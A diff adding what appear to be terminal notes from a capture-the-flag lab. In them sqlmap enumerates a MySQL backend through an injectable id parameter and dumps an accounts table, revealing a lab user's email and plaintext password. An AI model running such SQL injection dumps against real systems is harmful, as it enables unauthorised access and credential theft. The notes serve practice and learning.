@@ -1,0 +1,38 @@
+
+└─$ sqlmap -u http://localhost:8081?id=70824 --dbs 
+[22:03:16] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[22:03:16] [INFO] fetching database names
+[22:03:16] [INFO] fetching number of databases
+[22:03:16] [INFO] resumed: 5
+[22:03:16] [INFO] resumed: mysql
+[22:03:16] [INFO] resumed: information_schema
+[22:03:16] [INFO] resumed: performance_schema
+[22:03:16] [INFO] resumed: sys
+[22:03:16] [INFO] resumed: soccer_db
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
+
+
+└─$ sqlmap -u http://localhost:8081?id=70824 --dbs soccer_db --tables
+[22:04:25] [INFO] retrieved: accounts
+[22:06:01] [INFO] retrieved: binary_log_transaction
+
+└─$ sqlmap -u http://localhost:8081?id=70824 -D soccer_db -T accounts --dump
+
+18:07:08] [INFO] retrieved: username
+[18:08:42] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
+[18:08:42] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
+[18:08:42] [INFO] retrieved: 1
+[18:08:50] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                             
+player@player.htb
+[18:12:52] [INFO] retrieved: 1324
+[18:13:43] [INFO] retrieved: PlayerOftheMatch2022
+[18:17:46] [INFO] retrieved: player
+Database: soccer_db
+Table: accounts
+
